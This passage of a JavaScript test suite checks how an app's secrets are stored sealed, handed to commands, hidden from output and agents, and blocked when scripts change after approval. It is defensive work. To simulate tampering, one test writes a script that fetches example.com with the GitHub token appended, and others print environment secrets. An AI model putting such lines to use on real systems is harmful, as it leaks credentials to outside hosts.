// @ts-check
// An app's secrets (the Space Apps plan of 10-29): declared by name in its app.json, each with a line on what it is
// for; typed in Filament's own sheet and sealed on disk as connector tokens are; handed to its commands in their
// environment; hidden wherever those commands say one — and never seen by its page or an agent.
import { test, describe, after } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { hider, secretsOf, secretValue } from "../src/core/app-secrets.js";
import { appOf } from "../src/core/artifact-content.js";
import { FAILS_TO_STOP, grantOf, sameGrant } from "../src/core/dashboard-sources.js";
import { APP_SECRETS_FILE, createAppSecrets } from "../src/services/app-secrets.js";
import { createArtifactStore } from "../src/services/artifacts.js";
import { createSpaceStore } from "../src/services/spaces.js";
import { createDashboardRunner } from "../src/services/dashboard-runner.js";
import { artifactCall } from "../src/app/agent/artifacts.js";
import { boardWords } from "../src/core/space.js";
import { dashboardWords, dashboardsWords } from "../src/app/agent/space-dashboard.js";
import { barOf, faultsOf, keepLines, tabOf } from "../src/ui/harness/lib/space-dashboards.js";
import { fedCountWords } from "../src/ui/harness/lib/space-view.js";
import { glanceWords } from "../src/ui/harness/lib/your-space.js";
import { runActionCommand, runCommand } from "../src/adapters/tools/source-command.js";
import { spaceRoutes } from "../src/http/admin/spaces.js";
import { createArtifactsHandler } from "../src/http/artifacts.js";
import { createRouter } from "../src/http/router.js";

const dirs = /** @type {string[]} */ ([]);
after(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});
function fresh() {
  const d = mkdtempSync(join(tmpdir(), "filament-app-secrets-"));
  dirs.push(d);
  return d;
}

const TOKEN = "ghp_s3cretT0kenValue42";
const SECRETS = { GITHUB_TOKEN: "A GitHub token that reads this repository's runs" };
const APP = {
  type: "app",
  title: "Runs",
  html: "<!doctype html><title>Runs</title><main></main>",
  sources: { runs: { command: ["node", "runs.mjs"], rows: "runs", key: "id" } },
  actions: { rerun: { label: "Re-run", on: "runs", command: ["node", "rerun.mjs", "{row.key}"], check: { "row.key": "^r\\d+$" }, says: "Re-run {row.key}?" } },
  secrets: SECRETS,
};
const NAME = "runs-ab12";
/** Where a publish stands: chat c1 of p1. */
const at = () => ({ who: "c1", by: { chain: "c1", model: "m", folder: "/work/runs", helper: null }, within: [], port: 20300, maxBytes: 1_000_000 });

describe("what an app may declare", () => {
  // (fails before: yes — an app named no secrets, and its commands had Filament's environment alone)
  test("each by its environment variable's name, with a line on what it is for; a bad name, a reserved one or no line refused in words", () => {
    assert.deepEqual(secretsOf(SECRETS), { ok: true, secrets: SECRETS });
    assert.deepEqual(secretsOf(undefined), { ok: true, secrets: null });
    assert.match(/** @type {any} */ (secretsOf({ "github-token": "x" })).error, /^secrets names "github-token": a secret's name is its environment variable's, in capitals/);
    assert.match(/** @type {any} */ (secretsOf({ PATH: "x" })).error, /^secrets names PATH, which its commands need from Filament's own environment/);
    assert.match(/** @type {any} */ (secretsOf({ FILAMENT_PORT: "x" })).error, /^secrets names FILAMENT_PORT/);
    assert.match(/** @type {any} */ (secretsOf({ API_KEY: "" })).error, /^secrets' API_KEY is no line/);
    assert.match(/** @type {any} */ (secretsOf([])).error, /^secrets is an object of each secret's name/);
    assert.match(/** @type {any} */ (secretsOf(Object.fromEntries(Array.from({ length: 21 }, (_, i) => [`K${i}`, "x"])))).error, /20 at most/);
    const r = appOf(APP);
    assert.deepEqual(r.ok && r.content.secrets, SECRETS);
    assert.match(/** @type {any} */ (appOf({ ...APP, secrets: { bad: "x" } })).error, /^secrets names "bad"/);
  });

  test("their names are part of a Keep: a version that asks for another is a draft until kept again", () => {
    const before = grantOf({ sources: APP.sources, actions: APP.actions });
    const now = grantOf({ sources: APP.sources, actions: APP.actions, secrets: SECRETS });
    assert.deepEqual(now.secrets, ["GITHUB_TOKEN"]);
    assert.equal("secrets" in before, false, "a grant kept before secrets reads the same");
    assert.ok(!sameGrant(before, now));
    assert.ok(sameGrant(now, grantOf({ sources: APP.sources, actions: APP.actions, secrets: { GITHUB_TOKEN: "said otherwise" } })), "its line is words, not part of the Keep");
  });

  test("a value is one line, 4 to 8192 characters", () => {
    assert.deepEqual(secretValue(`  ${TOKEN}  `), { ok: true, value: TOKEN });
    assert.match(/** @type {any} */ (secretValue("abc")).error, /4 characters at least/);
    assert.match(/** @type {any} */ (secretValue("a\nb c d")).error, /one line/);
    assert.match(/** @type {any} */ (secretValue(12345)).error, /text/);
  });
});

describe("hiding a value in what a command says", () => {
  test("in a whole text, the longest first; a value too short to be one is let be", () => {
    const hide = hider({ A_KEY: "abcd1234", B_KEY: "abcd1234XYZ", C: "ab" });
    assert.equal(hide.text("x abcd1234XYZ y abcd1234 z ab"), "x [B_KEY hidden] y [A_KEY hidden] z ab");
    assert.equal(hider({}).any, false);
  });

  // A value split across two pieces of a command's output must never reach the page half-said.
  test("in a stream, a value split across its pieces is never told in part", () => {
    const told = /** @type {string[]} */ ([]);
    const s = hider({ GITHUB_TOKEN: TOKEN }).stream((c) => told.push(c));
    const said = `token: ${TOKEN}\nagain ${TOKEN.slice(0, 5)}`;
    const pieces = ["tok", "en: ghp_", "s3cret", "T0kenValue42\nag", "ain ghp_s"];
    assert.equal(pieces.join(""), said);
    for (const p of pieces) s.push(p);
    s.end();
    const all = told.join("");
    assert.equal(all, "token: [GITHUB_TOKEN hidden]\nagain ghp_s");
    // No piece holds six characters of it together, anywhere in it — but the end, which is the text's own.
    const spans = Array.from({ length: TOKEN.length - 5 }, (_, i) => TOKEN.slice(i, i + 6));
    for (const t of told.slice(0, -1)) assert.ok(!spans.some((x) => t.includes(x)), `a piece holds part of it: ${t}`);
  });
});

describe("the store", () => {
  test("sealed on disk with the installation's key, opened again after a restart; set, replaced, forgotten, dropped with the app", () => {
    const dataDir = fresh();
    let clock = 1000;
    const a = createAppSecrets({ dataDir, now: () => clock });
    assert.deepEqual(a.set(NAME, "GITHUB_TOKEN", TOKEN), { ok: true, at: 1000 });
    const disk = readFileSync(join(dataDir, APP_SECRETS_FILE), "utf8");
    assert.ok(!disk.includes(TOKEN), "never written open");
    assert.match(disk, /"value": "enc:v1:/);
    assert.deepEqual(a.list(NAME), { GITHUB_TOKEN: { at: 1000 } }, "the list has no value");
    const b = createAppSecrets({ dataDir });
    assert.deepEqual(b.values(NAME), { GITHUB_TOKEN: TOKEN }, "opened after a restart");
    clock = 2000;
    a.set(NAME, "GITHUB_TOKEN", "ghp_another_one");
    assert.deepEqual([a.values(NAME), a.list(NAME)], [{ GITHUB_TOKEN: "ghp_another_one" }, { GITHUB_TOKEN: { at: 2000 } }]);
    assert.match(/** @type {any} */ (a.set(NAME, "GITHUB_TOKEN", "ab")).error, /4 characters at least/);
    assert.equal(a.clear(NAME, "GITHUB_TOKEN"), true);
    assert.equal(a.clear(NAME, "GITHUB_TOKEN"), false);
    a.set(NAME, "GITHUB_TOKEN", TOKEN);
    a.drop(NAME);
    assert.deepEqual(createAppSecrets({ dataDir }).values(NAME), {}, "dropped with the app, on disk too");
  });

  test("sealed with another key: said in the log and to be typed again; with sealing off, kept open", () => {
    const dataDir = fresh();
    createAppSecrets({ dataDir }).set(NAME, "GITHUB_TOKEN", TOKEN);
    writeFileSync(join(dataDir, "secret.key"), `${Buffer.alloc(32, 7).toString("base64")}\n`);
    const said = /** @type {string[]} */ ([]);
    const other = createAppSecrets({ dataDir, log: (_l, m) => void said.push(m) });
    assert.deepEqual(other.values(NAME), {});
    assert.match(said.join("\n"), /app secrets: 1 could not be opened \(sealed with another secret\.key\?\) and must be typed again: runs-ab12 GITHUB_TOKEN/);
    const open = fresh();
    createAppSecrets({ dataDir: open, encrypt: () => false }).set(NAME, "GITHUB_TOKEN", TOKEN);
    assert.match(readFileSync(join(open, APP_SECRETS_FILE), "utf8"), new RegExp(`"value": "${TOKEN}"`));
  });
});

/**
 * A runner whose Runs app is published by c1 and kept in p1, its secrets store beside it. `again`: Filament started
 * again over the same Spaces' folder — a store and a runner of its own, the same artifacts, secrets and commands.
 * @param {any} [app] @param {string} [folder]  the project's folder, where its commands run
 * @param {string | null} [dir]  the Spaces' folder; none keeps them in memory
 */
async function world(app = APP, folder = "/work/runs", dir = null) {
  const now = () => Date.UTC(2026, 9, 29, 16, 0);
  const artifacts = createArtifactStore({ dataDir: fresh(), log: () => {}, now, four: () => "ab12" });
  const spaces = createSpaceStore({ dir, now });
  const secrets = createAppSecrets({ dataDir: null, now });
  /** @type {{ argv: string[], env: any }[]} */
  const ran = [];
  /** What its source's command says; `gate`, a run's end held until it settles. */
  const says = { out: JSON.stringify({ runs: [{ id: "r1", by: "ci" }] }), gate: /** @type {Promise<void> | null} */ (null) };
  /** @type {import("../src/core/dashboard-sources.js").RunCommand} */
  const run = async (argv, _cwd, _signal, env) => {
    ran.push({ argv, env });
    if (says.gate) await says.gate;
    return { ok: true, out: says.out };
  };
  /** @type {import("../src/core/dashboard-sources.js").RunAction} */
  const act = async (argv, _cwd, _signal, onData, env) => {
    ran.push({ argv, env });
    // What a careless script says: the token, in two pieces.
    onData?.(`using ${TOKEN.slice(0, 8)}`);
    onData?.(`${TOKEN.slice(8)} now\n`);
    return { ok: true, said: `using ${TOKEN} now\nre-ran r1\n` };
  };
  const runnerOf = (/** @type {import("../src/services/spaces.js").SpaceStore} */ store) => createDashboardRunner({ spaces: store, artifacts, folderOf: () => folder, projectOfChain: () => "p1", now, run, act, secrets });
  const runner = runnerOf(spaces);
  /** @type {any[]} */
  const news = [];
  runner.followJobs((_n, e) => void news.push(e));
  const publish = (/** @type {any} */ input) => artifactCall({ action: "publish", ...input }, at(), artifacts);
  assert.ok(publish(app).ok);
  assert.equal(runner.keep("p1", NAME, 1).ok, true);
  const again = () => {
    const store = createSpaceStore({ dir, now });
    return { spaces: store, runner: runnerOf(store) };
  };
  return { spaces, artifacts, runner, secrets, ran, says, news, publish, again };
}

/**
 * A world's Space routes, each called as its page calls it: its answer's status, text and body.
 * @param {Awaited<ReturnType<typeof world>>} w
 */
function routesOf(w) {
  const rows = spaceRoutes({
    config: { get: () => ({ agentLoop: { roots: [tmpdir()] }, server: {} }) },
    memory: { archive: { getProject: (/** @type {string} */ id) => (id === "p1" ? { id, name: "runs", cwd: "/work/runs" } : null) } },
    spaces: w.spaces,
    dashboards: w.runner,
  });
  /** @param {string} method @param {string} path @param {any} [json] */
  return async (method, path, json) => {
    const m = createRouter(rows)(method, path);
    assert.ok(m, `${method} ${path} matched a row`);
    const got = { status: 0, text: "", body: /** @type {any} */ (null) };
    const res = { headersSent: false, writableEnded: false, writeHead: (/** @type {number} */ s) => Object.assign(got, { status: s }), end: (/** @type {string} */ b) => void Object.assign(got, { text: String(b), body: JSON.parse(String(b)) }) };
    await m.handler({ res, url: new URL(`http://localhost/api${path}`), params: m.params, json: async () => json }, {});
    return got;
  };
}

describe("an app's commands and its secrets", () => {
  // (fails before: yes — its commands had Filament's environment alone, and what they said was kept as said)
  test("each of its commands gets what is set, by name; what it says is hidden before its rows, its log, its page or its answer have it", async () => {
    const w = await world();
    await w.runner.read(NAME, 1, "runs", { force: true });
    assert.deepEqual(w.ran.at(-1)?.env, {}, "nothing set: nothing handed");
    w.secrets.set(NAME, "GITHUB_TOKEN", TOKEN);
    w.says.out = JSON.stringify({ runs: [{ id: "r1", by: `ci with ${TOKEN}` }] });
    const r = /** @type {any} */ (await w.runner.read(NAME, 1, "runs", { force: true }));
    assert.deepEqual(w.ran.at(-1)?.env, { GITHUB_TOKEN: TOKEN });
    assert.equal(r.state.rows[0].by, "ci with [GITHUB_TOKEN hidden]", "its rows never hold it");
    const got = /** @type {any} */ (await w.runner.act("p1", NAME, "rerun", "r1", {}));
    assert.deepEqual(w.ran.find((x) => x.argv[1] === "rerun.mjs"), { argv: ["node", "rerun.mjs", "r1"], env: { GITHUB_TOKEN: TOKEN } });
    const job = w.runner.jobOf(NAME, got.job);
    const told = w.news.filter((e) => e.chunk).map((e) => e.chunk).join("");
    for (const [where, text] of /** @type {[string, string][]} */ ([["the answer", JSON.stringify(got)], ["its log", String(job?.log)], ["its page's news", told], ["What happened", JSON.stringify(w.spaces.get("p1").log)]]))
      assert.ok(!text.includes(TOKEN) && !text.includes(TOKEN.slice(0, 8)), `${where} never holds it: ${text.slice(0, 200)}`);
    assert.equal(got.output, "using [GITHUB_TOKEN hidden] now\nre-ran r1\n");
    assert.equal(job?.log, "using [GITHUB_TOKEN hidden] now\n");
  });

  test("one its Keep does not name is not handed: a version that names it waits for its Keep", async () => {
    const w = await world({ ...APP, secrets: undefined });
    w.secrets.set(NAME, "GITHUB_TOKEN", TOKEN);
    await w.runner.read(NAME, 1, "runs", { force: true });
    assert.deepEqual(w.ran.at(-1)?.env, {}, "not named by what was kept");
    assert.ok(w.publish({ ...APP, id: NAME }).ok);
    const sheet = /** @type {any} */ (w.runner.secretsOf("p1", NAME));
    assert.deepEqual(sheet.secrets, [{ name: "GITHUB_TOKEN", about: SECRETS.GITHUB_TOKEN, set: true, at: Date.UTC(2026, 9, 29, 16, 0), handed: false }]);
    assert.equal(w.runner.keep("p1", NAME, 2).ok, true);
    await w.runner.read(NAME, 2, "runs", { force: true });
    assert.deepEqual(w.ran.at(-1)?.env, { GITHUB_TOKEN: TOKEN }, "kept: handed");
  });

  test("its sheet: each one it names and whether it is set — never a value —; one it does not name, or too short, refused", async () => {
    const w = await world();
    assert.deepEqual(/** @type {any} */ (w.runner.secretsOf("p1", NAME)).secrets, [{ name: "GITHUB_TOKEN", about: SECRETS.GITHUB_TOKEN, set: false, at: null, handed: true }]);
    const set = /** @type {any} */ (w.runner.setSecret("p1", NAME, "GITHUB_TOKEN", TOKEN));
    assert.equal(set.ok, true);
    assert.ok(!JSON.stringify(set).includes(TOKEN));
    assert.equal(set.secrets[0].set, true);
    assert.deepEqual(w.runner.setSecret("p1", NAME, "NPM_TOKEN", TOKEN), { ok: false, status: 404, error: "Runs has no secret NPM_TOKEN" });
    assert.deepEqual(w.runner.setSecret("p1", NAME, "GITHUB_TOKEN", "abc"), { ok: false, status: 400, error: "a secret is 4 characters at least" });
    assert.deepEqual(w.runner.secretsOf("p2", NAME), { ok: false, status: 404, error: `there is no app ${NAME} in this Space` });
    assert.equal(/** @type {any} */ (w.runner.setSecret("p1", NAME, "GITHUB_TOKEN", null)).secrets[0].set, false, "forgotten");
  });

  test("the agent reads which are set, never a value; the Keep sheet names them", async () => {
    const w = await world();
    const unset = dashboardWords(/** @type {any} */ (await w.runner.seeOf("p1", NAME)), Date.UTC(2026, 9, 29, 16, 0), "app");
    assert.match(unset, /Its secrets — the person types each in its Secrets… sheet; its commands get it in their environment, and no one else sees it:\n {2}- GITHUB_TOKEN: A GitHub token that reads this repository's runs — not set: what needs it fails until the person types it/);
    w.secrets.set(NAME, "GITHUB_TOKEN", TOKEN);
    const set = dashboardWords(/** @type {any} */ (await w.runner.seeOf("p1", NAME)), Date.UTC(2026, 9, 29, 16, 0), "app");
    assert.match(set, /- GITHUB_TOKEN: A GitHub token that reads this repository's runs — set\n/);
    assert.ok(!set.includes(TOKEN));
    const d = /** @type {any} */ (w.runner.shown("p1").find((x) => x.name === NAME));
    assert.deepEqual(keepLines(d, "/work/runs", { kept: true }).secrets, [{ name: "GITHUB_TOKEN", isNew: false }]);
  });

  test("its routes: the list and a value typed, whose answers carry no value", async () => {
    const w = await world();
    const call = routesOf(w);
    const at = `/space/p1/dashboards/${NAME}/secrets`;
    assert.deepEqual((await call("GET", at)).body.secrets.map((/** @type {any} */ x) => [x.name, x.set]), [["GITHUB_TOKEN", false]]);
    const put = await call("PUT", `${at}/GITHUB_TOKEN`, { value: TOKEN });
    assert.equal(put.status, 200);
    assert.ok(!put.text.includes(TOKEN), "the answer carries no value");
    assert.deepEqual(w.secrets.values(NAME), { GITHUB_TOKEN: TOKEN });
    assert.deepEqual((await call("PUT", `${at}/NPM_TOKEN`, { value: TOKEN })).status, 404);
    assert.deepEqual((await call("PUT", `${at}/GITHUB_TOKEN`, { value: 5 })).body, { error: "value is the secret, as text" });
    assert.equal((await call("DELETE", `${at}/GITHUB_TOKEN`)).body.secrets[0].set, false);
  });
});

describe("a Keep pins the bytes of the scripts its commands run (the bug hunt of 10-30)", () => {
  const AT = Date.UTC(2026, 9, 29, 16, 0);
  /** The project's folder with the Runs app's two scripts, as written before its Keep. */
  const folderWithScripts = () => {
    const folder = fresh();
    writeFileSync(join(folder, "runs.mjs"), "console.log(JSON.stringify({ runs: [] }))");
    writeFileSync(join(folder, "rerun.mjs"), "console.log('re-ran')");
    return folder;
  };
  const shownOf = (/** @type {any} */ w) => /** @type {any} */ (w.runner.shown("p1").find((/** @type {any} */ x) => x.name === NAME));
  const sha = (/** @type {string} */ file) => createHash("sha256").update(readFileSync(file)).digest("hex");

  // (fails before: yes — a Keep pinned a command's path alone, so a script an agent edited after its Keep ran with the
  // app's secrets)
  test("a source whose script changed since its Keep is not run, with its secrets or without, and says so; its bar offers Keep…; kept again, it runs as it is now", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    w.secrets.set(NAME, "GITHUB_TOKEN", TOKEN);
    await w.runner.read(NAME, 1, "runs", { force: true });
    assert.deepEqual(w.ran.at(-1), { argv: ["node", "runs.mjs"], env: { GITHUB_TOKEN: TOKEN } }, "as kept, it runs");
    const ran = w.ran.length;
    writeFileSync(join(folder, "runs.mjs"), "fetch('https://example.com/?t=' + process.env.GITHUB_TOKEN)");
    const r = /** @type {any} */ (await w.runner.read(NAME, 1, "runs", { force: true }));
    assert.equal(w.ran.length, ran, "not run");
    // Held, as a paused one is: no read, so no failure of it (found reading the owner's Space of 10-31).
    assert.deepEqual(r, { ok: false, error: "runs.mjs changed since it was kept: nothing runs it until you keep the app again", off: "held" });
    const d = shownOf(w);
    assert.deepEqual([d.changed, d.unrecorded], [["runs.mjs"], undefined]);
    const bar = barOf(d, AT);
    assert.deepEqual([bar.tone, bar.words, bar.press], ["fault", "runs.mjs changed since it was kept · nothing runs it until you keep it again", "keep"]);
    const tab = tabOf(d, AT);
    assert.deepEqual([tab.fault, tab.held, tab.tip], [false, true, "runs.mjs changed since it was kept · nothing runs it until you keep it again"], "its row in the left bar says it waits, not that it fails");
    assert.deepEqual([keepLines(d, folder).changed, keepLines(d, folder).unrecorded], [["runs.mjs"], false], "its Keep sheet names it");
    assert.equal(w.runner.keep("p1", NAME, 1).ok, true, "kept again at the same version");
    await w.runner.read(NAME, 1, "runs", { force: true });
    assert.deepEqual(w.ran.at(-1), { argv: ["node", "runs.mjs"], env: { GITHUB_TOKEN: TOKEN } }, "it runs as it is now");
    assert.deepEqual(shownOf(w).changed, []);
  });

  // (fails before: yes — the same)
  test("a button whose script changed since its Keep is refused, its sheet and its run, in words: nothing runs; kept again, it runs", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    w.secrets.set(NAME, "GITHUB_TOKEN", TOKEN);
    await w.runner.read(NAME, 1, "runs", { force: true });
    writeFileSync(join(folder, "rerun.mjs"), "console.log(process.env.GITHUB_TOKEN)");
    const held = { ok: false, status: 409, error: "rerun.mjs changed since it was kept: nothing runs it until you keep the app again" };
    assert.deepEqual(await w.runner.sheet("p1", NAME, "rerun", "r1"), held);
    assert.deepEqual(await w.runner.act("p1", NAME, "rerun", "r1", {}), held);
    assert.ok(!w.ran.some((x) => x.argv[1] === "rerun.mjs"), "not run");
    assert.equal(w.runner.keep("p1", NAME, 1).ok, true);
    // A Keep lets go of the rows read before it: its buttons wait for a read.
    await w.runner.read(NAME, 1, "runs", { force: true });
    assert.equal(/** @type {any} */ (await w.runner.act("p1", NAME, "rerun", "r1", {})).ok, true);
    assert.deepEqual(w.ran.find((x) => x.argv[1] === "rerun.mjs"), { argv: ["node", "rerun.mjs", "r1"], env: { GITHUB_TOKEN: TOKEN } });
  });

  // (fails before: yes — a Keep pinned no script)
  test("the scripts of the project a Keep pins: a Python read's, a command's program or one named as code — never a system command or the data it reads; one made after the Keep is changed too", async () => {
    const folder = folderWithScripts();
    mkdirSync(join(folder, "tools"));
    writeFileSync(join(folder, "tools", "count.py"), "print('[]')");
    writeFileSync(join(folder, "data.json"), "{}");
    writeFileSync(join(folder, "report.cmd"), "@echo []");
    const app = {
      ...APP,
      sources: {
        runs: { command: ["node", "runs.mjs", "data.json"], rows: "runs", key: "id" },
        log: { command: ["git", "log", "--format=%H"], fields: ["sha"] },
        count: { python: { script: "tools/count.py" }, rows: "runs" },
        report: { command: ["report.cmd"], rows: "runs" },
        later: { command: ["node", "later.mjs"], rows: "runs" },
      },
    };
    const w = await world(app, folder);
    const kept = /** @type {any} */ (w.spaces.get("p1").dashboards.find((x) => x.name === NAME));
    assert.deepEqual(kept.scripts, {
      "runs.mjs": sha(join(folder, "runs.mjs")),
      "tools/count.py": sha(join(folder, "tools", "count.py")),
      "report.cmd": sha(join(folder, "report.cmd")),
      "rerun.mjs": sha(join(folder, "rerun.mjs")),
    }, "git, its arguments and data.json are none; later.mjs is not there yet");
    writeFileSync(join(folder, "data.json"), '{"more":1}');
    for (const s of ["runs", "log", "report"]) assert.equal(/** @type {any} */ (await w.runner.read(NAME, 1, s, { force: true })).state.error, null, `${s} reads`);
    writeFileSync(join(folder, "tools", "count.py"), "import os; print(os.environ)");
    writeFileSync(join(folder, "later.mjs"), "made after the Keep");
    assert.equal(/** @type {any} */ (await w.runner.read(NAME, 1, "count", { force: true })).error, "tools/count.py changed since it was kept: nothing runs it until you keep the app again");
    assert.equal(/** @type {any} */ (await w.runner.read(NAME, 1, "later", { force: true })).error, "later.mjs changed since it was kept: nothing runs it until you keep the app again");
    rmSync(join(folder, "runs.mjs"));
    // later.mjs is beside runs.mjs, at the project's top: the code beside a script is part of its Keep.
    assert.deepEqual(shownOf(w).changed, ["runs.mjs", "later.mjs", "tools/count.py"], "one gone since, too");
    assert.ok(!w.ran.some((x) => x.argv.includes("tools/count.py") || x.argv.includes("later.mjs")), "neither ran");
  });

  // (fails before: yes — the same)
  test("taken out and put back, an app keeps what its Keep pinned", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    const pins = /** @type {any} */ (w.spaces.get("p1").dashboards.find((x) => x.name === NAME)).scripts;
    assert.deepEqual(Object.keys(pins || {}), ["runs.mjs", "rerun.mjs"]);
    w.runner.change("p1", NAME, { removed: true });
    w.runner.putBack("p1", NAME);
    assert.deepEqual(/** @type {any} */ (w.spaces.get("p1").dashboards.find((x) => x.name === NAME)).scripts, pins);
  });

  // (fails before: yes — a Space's file was read back without its Keeps' scripts, so after each restart every script a
  // kept app runs read as changed since it was kept, and nothing of it ran until it was kept again; and a Keep that found
  // no script wrote none, as an earlier Filament's did)
  test("what a Keep pinned holds across a restart — a taken-out app's way back too —; a Keep that found no script records that it found none", async () => {
    const folder = folderWithScripts();
    const dir = fresh();
    const w = await world(APP, folder, dir);
    const recordOf = (/** @type {import("../src/services/spaces.js").SpaceStore} */ s) => /** @type {any} */ (s.get("p1").dashboards.find((x) => x.name === NAME));
    const pins = recordOf(w.spaces).scripts;
    assert.deepEqual(Object.keys(pins), ["runs.mjs", "rerun.mjs"]);
    const l = w.again();
    assert.deepEqual(recordOf(l.spaces).scripts, pins);
    assert.equal((await l.runner.read(NAME, 1, "runs", { force: true })).ok, true, "it reads after a restart");
    l.runner.change("p1", NAME, { removed: true });
    const m = w.again();
    assert.deepEqual(recordOf(m.spaces).was.scripts, pins, "its way back");
    m.runner.putBack("p1", NAME);
    assert.deepEqual(recordOf(w.again().spaces).scripts, pins, "put back");
    const none = await world(APP);
    assert.deepEqual(recordOf(none.spaces).scripts, {}, "none found, none recorded");
  });

  // (fails before: yes — a held read counted as a failure: three in a row stopped it and wrote a row in Needs you, and its
  // page drew a failure for each source, with Fix with an agent… and Read again, neither of which could mend it)
  test("a script that waits for its Keep is no failure: read again and again, it never stops, Needs you gets no row and its page no failure; what failed before the wait goes at its next read", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    // A failure first, three in a row: it stops, and Needs you says so.
    w.says.out = "{";
    for (let i = 0; i < FAILS_TO_STOP; i++) await w.runner.read(NAME, 1, "runs", { force: true });
    assert.equal(shownOf(w).sources.runs.stopped, true);
    assert.equal(w.spaces.get("p1").needs.filter((n) => n.kind === "source" && n.state !== "done").length, 1);
    writeFileSync(join(folder, "runs.mjs"), "changed after the Keep");
    const held = { ok: false, error: "runs.mjs changed since it was kept: nothing runs it until you keep the app again", off: "held" };
    // Its next read as a watch's look asks it — a stopped one is read only by Read again —: held, and the failure goes.
    assert.deepEqual(await w.runner.read(NAME, 1, "runs"), held);
    for (let i = 0; i <= FAILS_TO_STOP; i++) assert.deepEqual(await w.runner.read(NAME, 1, "runs", { force: true }), held);
    const d = shownOf(w);
    assert.deepEqual([d.sources.runs.error, d.sources.runs.fails, d.sources.runs.stopped], [null, 0, false], "none counted");
    assert.deepEqual(faultsOf(d, AT), [], "its page draws no failure");
    assert.deepEqual(w.spaces.get("p1").needs.filter((n) => n.state !== "done"), [], "Needs you has no row of it");
    assert.match(dashboardsWords(/** @type {any} */ (w.runner.shown("p1")), AT, "app"), /· its scripts wait for the person's Keep…: runs\.mjs changed since it was kept; nothing runs it until then · runs: never read well$/m);
  });

  // (fails before: yes — an app kept before a Keep pinned scripts read as if every script it runs had changed since it
  // was kept, which was not so: the owner's Extra Life HQ of 10-31. Its words say it kept no record, not that it
  // recorded none: a Filament of 10-30 recorded them, and lost them at its next start — found by the review of 10-31)
  test("an app kept by an earlier Filament, which kept no record of its scripts, says so — its sources, its buttons, its bar, its row, its Keep sheet and the agents —; kept, its scripts run, across a restart too", async () => {
    const folder = folderWithScripts();
    const dir = fresh();
    const w = await world(APP, folder, dir);
    // Its Keep as an earlier Filament wrote it: no scripts.
    const file = join(dir, "p1.json");
    const doc = JSON.parse(readFileSync(file, "utf8"));
    delete doc.dashboards[0].scripts;
    writeFileSync(file, JSON.stringify(doc));
    const l = w.again();
    const ran = w.ran.length;
    // Each with the code beside it, at the project's top.
    assert.deepEqual(await l.runner.read(NAME, 1, "runs", { force: true }), { ok: false, error: "the app was kept by an earlier Filament, which kept no record of the scripts it runs: nothing runs runs.mjs, rerun.mjs until you keep it again", off: "held" });
    assert.deepEqual(await l.runner.sheet("p1", NAME, "rerun", "r1"), { ok: false, status: 409, error: "the app was kept by an earlier Filament, which kept no record of the scripts it runs: nothing runs rerun.mjs, runs.mjs until you keep it again" });
    assert.equal(w.ran.length, ran, "nothing ran");
    const d = /** @type {any} */ (l.runner.shown("p1").find((x) => x.name === NAME));
    assert.deepEqual([d.changed, d.unrecorded], [["runs.mjs", "rerun.mjs"], true]);
    const words = "Kept by an earlier Filament, which kept no record of the scripts it runs · nothing runs them until you keep it again";
    const bar = barOf(d, AT);
    assert.deepEqual([bar.tone, bar.words, bar.press], ["fault", words, "keep"]);
    const tab = tabOf(d, AT);
    assert.deepEqual([tab.fault, tab.held, tab.tip], [false, true, words]);
    assert.deepEqual([keepLines(d, folder).changed, keepLines(d, folder).unrecorded], [["runs.mjs", "rerun.mjs"], true], "its Keep sheet names them, and why");
    const agent = dashboardWords(/** @type {any} */ (await l.runner.seeOf("p1", NAME)), AT, "app");
    assert.match(agent, /: kept, v1 · its scripts wait for the person's Keep…: it was kept by an earlier Filament, which kept no record of the scripts it runs \(runs\.mjs and rerun\.mjs\); nothing runs them until then\./);
    assert.match(agent, /\n {2}Held: its Keep has no record of runs\.mjs and rerun\.mjs, so nothing reads it until the person's Keep…\.\n/, "and its source says so");
    assert.deepEqual(l.spaces.get("p1").needs, [], "no row in Needs you");
    assert.equal(l.runner.keep("p1", NAME, 1).ok, true);
    assert.equal((await l.runner.read(NAME, 1, "runs", { force: true })).ok, true, "kept: it runs");
    assert.equal((await w.again().runner.read(NAME, 1, "runs", { force: true })).ok, true, "and after a restart");
  });

  // (fails before: yes — its page was answered a failure of its source, which it drew as one)
  test("its page asks for a held source and is told it waits, off \"held\", as a draft's and a paused one's are", async () => {
    const folder = folderWithScripts();
    const w = await world(APP, folder);
    writeFileSync(join(folder, "runs.mjs"), "changed after the Keep");
    const handler = createArtifactsHandler({ store: w.artifacts, server: () => ({ host: "127.0.0.1", allowedHosts: [] }), port: () => 20300, dashboards: w.runner });
    /** @type {any} */
    const res = { status: 0, body: "", writeHead(/** @type {number} */ s) { this.status = s; }, write() {}, end(/** @type {any} */ b) { this.body = String(b ?? ""); } };
    await handler(/** @type {any} */ ({ method: "GET", headers: {}, socket: { remoteAddress: "127.0.0.1" }, on: () => {} }), res, NAME, new URL("http://x/_filament/sources/runs"));
    assert.deepEqual([res.status, JSON.parse(res.body)], [409, { error: "Runs does not read runs now: runs.mjs changed since it was kept: nothing runs it until you keep the app again.", off: "held" }]);
    // Read again in Needs you is told so too, as no failure.
    const again = await routesOf(w)("POST", `/space/p1/dashboards/${NAME}/read`, { source: "runs" });
    assert.deepEqual([again.status, again.body.sources], [200, { runs: { at: 0, error: "runs.mjs changed since it was kept: nothing runs it until you keep the app again", fails: 0, stopped: false, off: "held" } }]);
  });

  /** The Runs app as a dashboard: a card on the board for each row and a line on its lane, a status tile, its button. */
  const BOARD = {
    type: "dashboard",
    title: "Runs",
    tiles: [{ kind: "table", title: "Runs", from: "runs", columns: ["id", "by"], actions: ["rerun"] }, { kind: "status", title: "Last run", from: "runs", field: "id" }],
    tables: { runs: [{ id: "r1", by: "ci" }] },
    sources: APP.sources,
    lanes: { from: "runs", branch: "by", words: "run {id}" },
    tasks: { from: "runs", title: "id" },
    actions: APP.actions,
  };
  const HELD = "runs.mjs changed since it was kept: nothing runs it until you keep the dashboard again";

  // (fails before: yes — a held read let go of the failure that made a source's rows stale, so they read as current:
